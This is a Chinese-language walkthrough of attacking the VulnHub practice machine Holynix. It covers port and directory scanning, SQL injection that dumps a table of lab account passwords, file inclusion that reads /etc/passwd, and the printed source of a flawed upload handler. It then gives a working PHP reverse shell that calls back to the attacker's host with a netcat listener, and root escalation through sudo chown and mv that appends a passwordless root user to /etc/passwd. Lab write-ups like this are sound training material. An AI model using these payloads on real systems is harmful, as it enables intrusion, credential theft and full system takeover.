# 靶机信息
holynix是vulnhub中的一台简单难度的渗透测试靶机

# 初始枚举
## 端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/holynix]
└─$ nmap -sT -p- --min-rate  1000 192.168.218.192 -oA nmapScan/ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:13 EDT
Nmap scan report for 192.168.218.192
Host is up (0.0011s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:BC:05:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```
只扫出来一个80端口，利用向量很少，那就应该很简单了。


# web枚举
访问页面，需要登录

<img width="1919" height="1037" alt="Image" src="https://github.com/user-attachments/assets/b07425a5-05bd-48f7-b2e7-c7a94b6a929a" />

先扫目录
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/holynix]
└─$ gobuster dir -u http://192.168.218.192/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.192/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/misc                 (Status: 301) [Size: 357] [--> http://192.168.218.192/misc/]
/login.php            (Status: 200) [Size: 342]
/login                (Status: 200) [Size: 342]
/img                  (Status: 301) [Size: 356] [--> http://192.168.218.192/img/]
/upload               (Status: 301) [Size: 359] [--> http://192.168.218.192/upload/]
/upload.php           (Status: 200) [Size: 44]
/home                 (Status: 200) [Size: 109]
/home.php             (Status: 200) [Size: 109]
/index                (Status: 200) [Size: 776]
/index.php            (Status: 200) [Size: 776]
/header               (Status: 200) [Size: 604]
/header.php           (Status: 200) [Size: 604]
/footer.php           (Status: 200) [Size: 63]
/footer               (Status: 200) [Size: 63]
/transfer.php         (Status: 200) [Size: 44]
/transfer             (Status: 200) [Size: 44]
/messageboard.php     (Status: 200) [Size: 249]
/messageboard         (Status: 200) [Size: 249]
/server-status        (Status: 403) [Size: 336]
/calender.php         (Status: 200) [Size: 247]
/calender             (Status: 200) [Size: 247]
/ssp                  (Status: 301) [Size: 356] [--> http://192.168.218.192/ssp/]
/ssp.php              (Status: 200) [Size: 44]
/index.php            (Status: 200) [Size: 776]
/index                (Status: 200) [Size: 776]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```
扫出来很多，除了内容受限就是sql报错。那就看看login.php页面，sqlmap扫了一下似乎注入不了，扒拉了一会，发现要在主页登录  **/index.php?page=login.php** 主页的登录功能有注入漏洞。
>available databases [4]:                                                                                                                                                                            
>[*] clients                                                                                                                                                                                         
>[*] creds                                                                                                                                                                                           
>[*] information_schema                                                                                                                                                                              
>[*] mysql  

扫出来四个库
>Database: clients
>[2 tables]
>+----------+
>| accounts |
>| credits  |
>+----------+

clients库中有两个表，好像没有密码

>Database: creds
[5 tables]
+-------------+
| page        |
| accounts    |
| blogs_table |
| calender    |
| employee    |
>+-------------+


>Database: creds                                                                                                                                                                                     
Table: accounts                                                                                                                                                                                     
[11 entries]                                                                                                                                                                                        
+-----+--------+--------------------+------------+                                                                                                                                                  
| cid | upload | password           | username   |                                                                                                                                                  
+-----+--------+--------------------+------------+                                                                                                                                                  
| 1   | 0      | Ih@cK3dM1cR05oF7   | alamo      |                                                                                                                                                  
| 2   | 1      | P3n7@g0n0wN3d      | etenenbaum |                                                                                                                                                  
| 3   | 1      | d15cL0suR3Pr0J3c7  | gmckinnon  |                                                                                                                                                  
| 4   | 1      | Ik1Ll3dNiN@r315er  | hreiser    |                                                                                                                                                  
| 5   | 1      | p1@yIngW17hPh0n35  | jdraper    |                                                                                                                                                  
| 6   | 1      | @rR35t3D@716       | jjames     |                                                                                                                                                  
| 7   | 1      | m@k1nGb0o7L3g5     | jljohansen |                                                                                                                                                  
| 8   | 1      | wH@7ar37H3Fed5D01n | kpoulsen   |                                                                                                                                                  
| 9   | 0      | f@7H3r0FL1nUX      | ltorvalds  |                                                                                                                                                  
| 10  | 1      | n@5aHaSw0rM5       | mrbutler   |                                                                                                                                                  
| 11  | 1      | Myd@d51N7h3NSA     | rtmorris   |                                                                                                                                                  
>+-----+--------+--------------------+------------+   
creds库中有5个库，accounts表中有密码，可以尝试爆破一下。好像都可以登录，每个用户的功能好像都一样。

使用alamo登录上来，有个上传功能，上传webshell，有报错，说该用户没有在home目录上传文件的权限，暴露了上传文件的地址在/home下。换第二个用户登录，可以上传文件，怎么利用呢，怀疑有文件包含的漏洞，主页上有page参数，试一下不是，找一下这些页面有没有文件包含的线索。
在安全功能有发现，下面的文章好像是文件包含出来的

<img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/4de2c55e-6dfe-4d3c-9afb-91d7baee53b7" />

修改下面value的值为/etc/passwd

<img width="1919" height="1027" alt="Image" src="https://github.com/user-attachments/assets/2dd23f44-2f69-481a-8699-ebb7fefeb3c5" />

再尝试包含我们刚刚上传的webshell

<img width="1919" height="1033" alt="Image" src="https://github.com/user-attachments/assets/f7b5be9a-dda6-495f-8e5e-4ed808c11bdb" />
报错了权限不足，上传压缩文件试试，但是没有自动解压，奇怪了，上传文件的时候url上有文件提交的路径transfer.php，文件包含看一下源码
```
";
} else {
	if ( $upload == 1 )
	{
		$homedir = "/home/".$logged_in_user. "/";
		$uploaddir = "upload/";
		$target = $uploaddir . basename( $_FILES['uploaded']['name']) ;
		$uploaded_type = $_FILES['uploaded']['type'];
		$command=0;
		$ok=1;

		if ( $uploaded_type =="application/gzip" && $_POST['autoextract'] == 'true' ) {	$command = 1; }

		if ($ok==0)
		{
			echo "Sorry your file was not uploaded";
			echo "[Back to upload page](http://192.168.218.192/index.php?index.php?page=upload.php)";
		} else {
        		if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target))
			{
				echo "
The file '" .$_FILES['uploaded']['name']. "' has been uploaded.

";
				echo "The ownership of the uploaded file(s) have been changed accordingly.";
				echo "
[Back to upload page](http://192.168.218.192/index.php?page=upload.php)";
				if ( $command == 1 )
				{
					exec("sudo tar xzf " .$target. " -C " .$homedir);
					exec("rm " .$target);
				} else {
					exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
				}
				exec("/var/apache2/htdocs/update_own");
        		} else {
				echo "Sorry, there was a problem uploading your file.
";
				echo "
[Back to upload page](http://192.168.218.192/index.php?page=upload.php)";
			}
		}
	} else { echo "

Home directory uploading disabled for user " .$logged_in_user. "
"; }
}
?>
```
发现它是使用的 xzf 解压的文件，那我们就使用 czf 参数压缩。` tar czf rev.php.tar.gz rev.php`
```
<?php
$ip = '192.168.218.148';  
$port = 4444;             
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', 
    array(0 => $sock, 1 => $sock, 2 => $sock), 
    $pipes);
?>
```
开启kali监听，点击解压了的rev.php

<img width="1910" height="429" alt="Image" src="https://github.com/user-attachments/assets/b05912c5-b4cc-4232-86ab-249190a59774" />


```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 4444
[sudo] kali 的密码：
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.192] 34769
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
# 提权
拿到shell了，开始提权
```
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```
提权很简单了
```
www-data@holynix:/home/etenenbaum$ sudo chown etenenbaum /etc/passwd
sudo chown etenenbaum /etc/passwd
www-data@holynix:/home/etenenbaum$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--r-- 1 etenenbaum root 1490 Nov  8  2010 /etc/passwd
```
这里改错所属者了，改成www-data
这样就可以直接编辑了
`echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd`
不给无密码登录，那就使用openssl生成一个，太麻烦了，用mv吧
```
www-data@holynix:/home/etenenbaum$ sudo mv /bin/tar /bin/tar.bak
sudo mv /bin/tar /bin/tar.bak
www-data@holynix:/home/etenenbaum$ sudo mv /bin/su /bin/tar
sudo mv /bin/su /bin/tar
www-data@holynix:/home/etenenbaum$ sudo /bin/tar
sudo /bin/tar
root@holynix:/home/etenenbaum# 
```

提权成功了
## 反思
这个靶机很有意思，利用到了很多漏洞链，之后看别人的wp。还有cookie的水平越权没发现，一环接一环的路子，很有意思，但是中间也会被卡一会。
